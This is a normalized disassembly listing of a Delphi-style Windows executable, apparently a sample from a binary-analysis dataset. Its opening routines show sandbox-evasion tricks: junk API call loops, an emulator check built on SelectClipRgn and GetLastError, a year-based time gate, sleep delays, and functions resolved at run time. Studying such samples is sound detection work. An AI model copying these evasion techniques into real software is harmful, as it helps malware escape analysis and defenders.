nop
dec ebx
jne r-xdata
mov eax 0x1ebc3a75
call sub_4026bc
mov ebx eax
test ebx ebx
jne r-xdata
mov [ rw-data ] 0xde09
nop
nop
mov ecx 0x1ebc3a75
xor edx edx
mov eax ebx
call sub_4627e0
push 0x0
push 0x0
call GetAncestor
mov eax ebx
call sub_4026dc
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
mov ebx 0xb85b
nop
nop
pop ebx
retn
push 0x0
push 0x0
call GetAncestor
dec ebx
jne r-xdata
push 0x0
call sub_45cdd8
nop
pop ebx
retn
sub_4628a1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4628c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4628d0
retn
sub_4628d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi rw-data
xor eax eax
push ebp
push sub_462a69
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462a70
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_4029e4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40c054
test eax eax
jne r-xdata
mov ebx 0x1734
push 0x0
push 0x0
call GetAncestor
dec ebx
jne r-xdata
mov ebx 0x263fd
push 0x0
push 0x0
call GetAncestor
nop
nop
dec ebx
jne r-xdata
push 0x0
push 0x0
call SelectClipRgn
call GetLastError
cmp eax 0x6
je r-xdata
mov eax 0x223d17ad
call sub_4026bc
mov ebx eax
test ebx ebx
jne r-xdata
nop
nop
jmp r-xdata
mov ecx 0x223d17ad
xor edx edx
mov eax ebx
call sub_4627e0
push r-xdata
push r-xdata
call __imp_LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
push 0x0
push 0x0
call GetAncestor
mov eax ebx
call sub_4026dc
push 0x0
push 0x0
call GetAncestor
nop
mov ebx 0x8eea
jmp r-xdata
push 0x0
push 0x0
call GetAncestor
dec ebx
jne r-xdata
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x0
push rw-data
call GetSystemTime
cmp [ rw-data ] 0x7e1
jb r-xdata
jmp r-xdata
nop
nop
xor ebx ebx
xor esi esi
nop
cmp ebx 0x4
jle r-xdata
nop
nop
inc ebx
nop
mov esi [ edi + 0x4 ]
nop
push 0x0
push 0x103
call SleepEx
jmp r-xdata
call sub_462800
nop
jmp r-xdata
mov [ edi ] 0x8
nop
nop
xor eax eax
mov [ edi + 0x4 ] eax
nop
nop
push edi
call [ rw-data ]
mov eax [ edi + 0x4 ]
sub eax esi
cmp eax 0x155
jbe r-xdata
sub_462acc
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403960
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462af2
retn
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax r-xdata
call sub_405d14
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b58c
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_45b5a4
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b624
call sub_403e6c
sub_40114f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_40566c
sub_401159
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405680
ExitProcess
jmp [ ExitProcess@IAT ]
sub_40122c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401244
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_401254
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40125c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_40128c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
sub_4012ac
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_4012cc
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
InterlockedIncrement
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
InterlockedDecrement
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_4012fc
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40130c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401330
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ VirtualFree@IAT ]
sub_401350
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401358
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401360
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ab2
jmp sub_403960
sub_401ab9
mov al [ rw-data ]
pop ebp
retn
sub_401b96
jmp sub_403960
sub_401c64
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402278
retn
sub_402264
jmp sub_403960
sub_40240a
jmp sub_403960
sub_4026a9
jmp sub_403960
sub_40276c
call sub_405cc8
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405cc8
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027c0
mov [ rw-data ] edx
call sub_403f44
sub_402824
push eax
push edx
push ecx
call sub_405cc8
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402818
retn
sub_402840
retn
sub_402894
retn
sub_402898
push ebx
call sub_405cc8
mov ebx [ eax + 0x4 ]
call sub_405cc8
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402a44
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402a54
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402acc
mov edx [ eax + 0x1c ]
call sub_402a84
retn
sub_402d34
mov ecx 0xff
call sub_402d40
retn
sub_402d64
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402d80
jmp sub_402d80
sub_402d7d
retn
sub_40310d
jmp sub_403960
sub_403160
fninit
fwait
fldcw [ rw-data ]
retn
sub_4031b0
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_4031bc
push ebx
mov ebx eax
mov eax ebx
call sub_4031ec
call sub_4026bc
mov edx eax
mov eax ebx
call sub_403230
pop ebx
retn
sub_4031d8
push ebx
mov ebx eax
mov eax ebx
call sub_403288
mov eax ebx
call sub_4026dc
pop ebx
retn
sub_4031ec
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403214
call sub_403598
test dl dl
jle r-xdata
retn
call sub_403580
sub_4032d4
retn
sub_40335c
jmp sub_403960
sub_403363
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_403454
mov eax 0x8000ffff
retn
sub_40345c
retn
sub_403460
retn
sub_403464
retn
sub_403559
jmp sub_4036ac
sub_40355e
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_4039c0
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_403580
sub_403580
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_403588
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_403598
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_4035a8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_403670
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_40368c
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403a59
retn
sub_403b9c
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403c2a
jmp sub_4036ac
sub_403c8a
jmp sub_4036ac
sub_403ca4
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403b9c
mov [ rw-data ] 0x0
call sub_403c44
retn
sub_403ddd
retn
sub_403f3f
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403f44
mov [ rw-data ] eax
call sub_403e6c
sub_404180
retn
sub_4041bc
retn
sub_4041ca
retn
sub_4041e3
retn
sub_4041f4
retn
sub_4042db
retn
sub_40440c
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_404428#2
jmp sub_404428
sub_404471
retn
j_sub_404428
jmp sub_404428
sub_404479
retn
sub_4044bb
retn
sub_404614
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
sub_40462c
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_404784
retn
sub_404796
retn
sub_404798
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_4049c0
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402818
call [ rw-data ]
retn
sub_404ac4
mov ecx 0x1
jmp sub_4049d8
sub_404ace
retn
sub_404ad0
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402818
call [ rw-data ]
retn
sub_404cf6
retn
sub_404cf8
mov al 0x11
jmp sub_402818
sub_404d23
retn
sub_404d34
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404c04
pop ebp
retn 0x4
j_sub_4049d8
jmp sub_4049d8
sub_404d49
retn
sub_404d4c
call sub_404eec
retn
sub_404f78
call sub_404f50
retn
sub_4052c1
jmp sub_403960
sub_40542c
call sub_40543c
retn
sub_405434
call sub_40545c
retn
sub_40543c
push ebx
mov ebx eax
mov eax 0x8
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_4054f7
jmp sub_4036ac
sub_405518
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_40558c
jmp sub_403960
sub_405593
pop ecx
pop ebp
retn
sub_40560c
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405618
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_405624
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402818
sub_405634
call sub_4031bc
mov [ eax + 0x4 ] 0x1
retn
sub_40566c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_40595b
jmp sub_403960
sub_405962
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4059ff
jmp sub_403960
sub_405a06
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405a4f
jmp sub_403960
sub_405a56
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405b1a
jmp sub_403960
sub_405b21
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405b72
jmp sub_403960
sub_405b79
pop ebp
retn
sub_405c50
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
TlsSetValue
jmp [ __import_lookup_table_4(kernel32:TlsSetValue) ]
sub_405c70
push eax
push 0x40
call LocalAlloc
retn
sub_405c7c
mov eax 0x10
retn
sub_405d08
mov eax rw-data
call sub_405518
retn
sub_405d7d
jmp sub_403960
sub_405d84
pop ebp
retn
sub_405d88
sub [ rw-data ] 0x1
retn
sub_405d90
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405dac
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_405df5
jmp sub_403960
sub_405dfc
pop ebp
retn
sub_405e00
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ __import_lookup_table_5(advapi32:RegCloseKey) ]
RegOpenKeyExA
jmp [ RegOpenKeyExA@IAT ]
RegQueryValueExA
jmp [ RegQueryValueExA@IAT ]
CompareStringA
jmp [ CompareStringA@IAT ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
InterlockedExchange
jmp [ __import_lookup_table_6(kernel32:InterlockedExchange) ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ __import_lookup_table_6(kernel32:GetLocalTime) ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetProfileStringA
jmp [ GetProfileStringA@IAT ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetSystemTime
jmp [ GetSystemTime@IAT ]
GetVersion
jmp [ __import_lookup_table_6(kernel32:GetVersion) ]
GetVersionExA
jmp [ __import_lookup_table_6(kernel32:GetVersionExA) ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalHandle
jmp [ __import_lookup_table_6(kernel32:GlobalHandle) ]
GlobalReAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalReAlloc) ]
GlobalSize
jmp [ __import_lookup_table_6(kernel32:GlobalSize) ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
__imp_LoadLibraryA
jmp [ LoadLibraryA@IAT ]
LoadResource
jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_4060cc
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SleepEx
jmp [ SleepEx@IAT ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoSizeA) ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDCA
jmp [ CreateDCA@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ __import_lookup_table_8(gdi32:CreateHalftonePalette) ]
CreateICA
jmp [ __import_lookup_table_8(gdi32:CreateICA) ]
CreatePalette
jmp [ __import_lookup_table_8(gdi32:CreatePalette) ]
CreatePenIndirect
jmp [ __import_lookup_table_8(gdi32:CreatePenIndirect) ]
EndDoc
jmp [ EndDoc@IAT ]
EndPage
jmp [ __import_lookup_table_8(gdi32:EndPage) ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
ExtTextOutA
jmp [ ExtTextOutA@IAT ]
GetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:GetBrushOrgEx) ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ __import_lookup_table_8(gdi32:GetDCOrgEx) ]
GetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:GetDIBColorTable) ]
GetPixel
jmp [ GetPixel@IAT ]
GetTextExtentPoint32A
jmp [ __import_lookup_table_8(gdi32:GetTextExtentPoint32A) ]
GetWindowOrgEx
jmp [ __import_lookup_table_8(gdi32:GetWindowOrgEx) ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ __import_lookup_table_8(gdi32:MaskBlt) ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
Polyline
jmp [ Polyline@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ Rectangle@IAT ]
SelectClipRgn
jmp [ SelectClipRgn@IAT ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:SetDIBColorTable) ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ __import_lookup_table_8(gdi32:SetROP2) ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
UnrealizeObject
jmp [ __import_lookup_table_8(gdi32:UnrealizeObject) ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginDeferWindowPos
jmp [ __import_lookup_table_9(user32:BeginDeferWindowPos) ]
BeginPaint
jmp [ __import_lookup_table_9(user32:BeginPaint) ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CallWindowProcA
jmp [ CallWindowProcA@IAT ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ __import_lookup_table_9(user32:CharToOemA) ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ __import_lookup_table_9(user32:DefFrameProcA) ]
DefMDIChildProcA
jmp [ __import_lookup_table_9(user32:DefMDIChildProcA) ]
DefWindowProcA
jmp [ __import_lookup_table_9(user32:DefWindowProcA) ]
DeferWindowPos
jmp [ __import_lookup_table_9(user32:DeferWindowPos) ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
DrawFocusRect
jmp [ DrawFocusRect@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
EnableScrollBar
jmp [ __import_lookup_table_9(user32:EnableScrollBar) ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndDeferWindowPos
jmp [ EndDeferWindowPos@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ FindWindowA@IAT ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetCursor
jmp [ GetCursor@IAT ]
GetCursorPos
jmp [ GetCursorPos@IAT ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ __import_lookup_table_9(user32:GetKeyboardLayout) ]
GetKeyboardLayoutList
jmp [ __import_lookup_table_9(user32:GetKeyboardLayoutList) ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetScrollInfo
jmp [ __import_lookup_table_9(user32:GetScrollInfo) ]
GetScrollPos
jmp [ __import_lookup_table_9(user32:GetScrollPos) ]
GetScrollRange
jmp [ __import_lookup_table_9(user32:GetScrollRange) ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ GetSysColor@IAT ]
GetSysColorBrush
jmp [ GetSysColorBrush@IAT ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetWindowDC
jmp [ __import_lookup_table_9(user32:GetWindowDC) ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ __import_lookup_table_9(user32:IsWindowEnabled) ]
IsZoomed
jmp [ __import_lookup_table_9(user32:IsZoomed) ]
KillTimer
jmp [ __import_lookup_table_9(user32:KillTimer) ]
LoadBitmapA
jmp [ __import_lookup_table_9(user32:LoadBitmapA) ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ __import_lookup_table_9(user32:LoadStringA) ]
MapVirtualKeyA
jmp [ __import_lookup_table_9(user32:MapVirtualKeyA) ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
PostQuitMessage
jmp [ __import_lookup_table_9(user32:PostQuitMessage) ]
PtInRect
jmp [ __import_lookup_table_9(user32:PtInRect) ]
RedrawWindow
jmp [ __import_lookup_table_9(user32:RedrawWindow) ]
RegisterClassA
jmp [ __import_lookup_table_9(user32:RegisterClassA) ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ __import_lookup_table_9(user32:ReleaseDC) ]
RemoveMenu
jmp [ __import_lookup_table_9(user32:RemoveMenu) ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ __import_lookup_table_9(user32:SetScrollInfo) ]
SetScrollRange
jmp [ SetScrollRange@IAT ]
SetTimer
jmp [ SetTimer@IAT ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ __import_lookup_table_9(user32:SetWindowsHookExA) ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ __import_lookup_table_9(user32:TrackPopupMenu) ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ __import_lookup_table_9(user32:TranslateMessage) ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnregisterClassA
jmp [ __import_lookup_table_9(user32:UnregisterClassA) ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ __import_lookup_table_9(user32:WaitMessage) ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_406820
call GetTickCount
retn
sub_406828
xor eax eax
retn
sub_40682c
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_40683c
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406858
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_40686c
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_4068a4
call sub_406814
retn
sub_4068ac
call sub_406814
retn
CreateWindowExA
jmp [ __import_lookup_table_9(user32:CreateWindowExA) ]
sub_406a89
jmp sub_403960
sub_406a90
pop ebp
retn
sub_406a94
sub [ rw-data ] 0x1
retn
sub_406ac1
jmp sub_403960
sub_406ac8
pop ebp
retn
sub_406acc
sub [ rw-data ] 0x1
retn
sub_406dd1
jmp sub_403960
sub_406dd8
pop ebp
retn
sub_406ddc
sub [ rw-data ] 0x1
retn
sub_407899
add eax 0xffffffd4
jmp sub_40cc68
sub_4078a1
add eax 0xffffffd4
jmp sub_40cb10
sub_4078a9
add eax 0xffffffd4
jmp sub_40cbac
sub_4078bb
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40566c
sub_4078c5
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405680
sub_407bf4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407bbc
test eax eax
sete al
pop esi
pop ebx
retn
sub_407dd5
jmp sub_403960
sub_407ddc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_408274
call sub_408250
retn
sub_40830c
push eax
call CloseHandle
retn
sub_408494
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_4084a8
push esi
mov esi eax
xchg edx eax
call sub_4028b8
mov eax esi
pop esi
retn
sub_408694
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026bc
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_4086a8
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_4086e0
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4026dc
sub_408748
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402818
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
